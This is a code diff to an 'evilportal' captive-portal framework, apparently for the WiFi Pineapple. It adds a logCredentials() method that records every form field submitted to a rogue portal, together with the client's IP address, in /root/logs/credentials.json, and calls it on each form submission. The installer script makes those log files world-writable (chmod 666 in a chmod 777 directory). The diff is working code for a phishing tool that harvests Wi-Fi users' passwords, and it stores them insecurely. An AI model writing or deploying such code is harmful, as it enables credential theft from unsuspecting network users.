@@ -194,15 +194,42 @@ abstract class Portal
         $this->execBackground("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info '{$message}' evilportal");
     }
 
+    protected $LOG_DIR = "/root/logs";
+    protected $CREDENTIALS_FILE = "/root/logs/credentials.json";
+
     protected final function writeLog($message)
     {
-        try {
-            $reflector = new \ReflectionClass(get_class($this));
-            $logPath = dirname($reflector->getFileName());
-            file_put_contents("{$logPath}/.logs", "{$message}\n", FILE_APPEND);
-        } catch (\ReflectionException $e) {
-            // do nothing.
+        // Write to the dedicated, world-writable log directory created by the
+        // installer (chmod 777 /root/logs). The portal directories are mode 755
+        // and owned such that the PHP-FPM worker (nobody) cannot write into them,
+        // so logging must NOT target the portal's own directory.
+        @file_put_contents("{$this->LOG_DIR}/.logs", "{$message}\n", FILE_APPEND | LOCK_EX);
+    }
+
+    // Capture submitted credentials as structured JSON lines in credentials.json.
+    // Accepts any POSTed fields except the internal 'target' redirect field.
+    protected final function logCredentials()
+    {
+        $fields = array();
+        foreach ((array)$this->request as $key => $value) {
+            if ($key === 'target') {
+                continue;
+            }
+            $fields[$key] = $value;
         }
+        if (empty($fields)) {
+            return;
+        }
+        $entry = array(
+            'timestamp' => date('c'),
+            'ip'        => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
+            'fields'    => $fields,
+        );
+        @file_put_contents(
+            $this->CREDENTIALS_FILE,
+            json_encode($entry) . "\n",
+            FILE_APPEND | LOCK_EX
+        );
     }
 
     protected function authorizeClient($clientIP)
@@ -219,6 +246,7 @@ abstract class Portal
         if ($this->isClientAuthorized($_SERVER['REMOTE_ADDR']) and isset($this->request->target)) {
             $this->redirect();
          } elseif (isset($this->request->target)) {
+             $this->logCredentials();
              $this->authorizeClient($_SERVER['REMOTE_ADDR']);
              $this->onSuccess();
              $this->redirect();
@@ -487,6 +515,11 @@ chmod -R 755 /root/portals/
 # Create logs directory with write permissions for PHP-FPM (runs as nobody)
 mkdir -p /root/logs
 chmod 777 /root/logs
+
+# Pre-create log files so the first PHP-FPM write cannot fail on a
+# missing/owned file. Credentials are captured to credentials.json.
+touch /root/logs/credentials.json /root/logs/.logs
+chmod 666 /root/logs/credentials.json /root/logs/.logs
 
 LOG "SUCCESS: Permissions configured"
 
